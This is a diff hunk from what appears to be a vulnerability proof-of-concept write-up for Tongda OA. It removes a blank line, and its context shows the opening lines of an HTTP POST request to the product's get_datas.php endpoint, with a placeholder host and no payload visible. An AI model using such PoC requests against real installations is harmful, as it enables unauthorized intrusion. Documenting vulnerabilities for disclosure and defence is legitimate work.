@@ -7,7 +7,6 @@ app="TDXK-通达OA"
 
 ## POC
 ```
-
 POST /general/reportshop/utils/get_datas.php HTTP/1.1
 Host: {{HostName}}
 Accept-Encoding: gzip, deflate
